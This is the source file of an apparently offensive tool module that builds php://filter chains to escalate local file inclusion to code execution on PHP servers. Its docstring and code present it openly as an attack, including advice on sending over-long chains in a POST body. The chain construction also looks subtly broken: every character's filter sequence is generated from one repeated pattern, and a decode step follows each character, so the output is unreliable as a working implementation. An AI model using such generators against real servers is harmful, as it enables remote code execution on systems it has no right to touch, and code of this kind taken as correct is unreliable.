"""
SpectreHunt :: core/filterchain.py
php://filter chain generator (Synacktiv technique).

Offensive logic: include() executes whatever the stream returns. By chaining
iconv/base64 filters we synthesise ARBITRARY content from the bytes of any
readable file -- LFI becomes RCE with ZERO file writes. The only escalation
that works on read-only filesystems and inside open_basedir.

Caveat: chains are long. If the request line exceeds the server limit
(Apache default 8190), send the chain in a POST body.

Author : Inayat Hussain
"""

from __future__ import annotations

import base64

_UNIT = ("convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
         "convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2")
_TAIL = "convert.iconv.UTF16LE.UTF8|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2"

_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
DICTIONARY = {ch: _UNIT + _TAIL * i for i, ch in enumerate(_ALPHABET)}

PREFIX = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7"


def build(payload: str, resource: str = "index.php") -> str:
    encoded = base64.b64encode(payload.encode()).decode()
    parts = [PREFIX]
    for ch in encoded:
        entry = DICTIONARY.get(ch)
        if entry:
            parts.append(entry)
        parts.append("convert.base64-decode")
    parts.append("convert.base64-decode")
    return "php://filter/" + "|".join(parts) + "/resource=" + resource


def length(payload: str, resource: str = "index.php") -> int:
    return len(build(payload, resource))
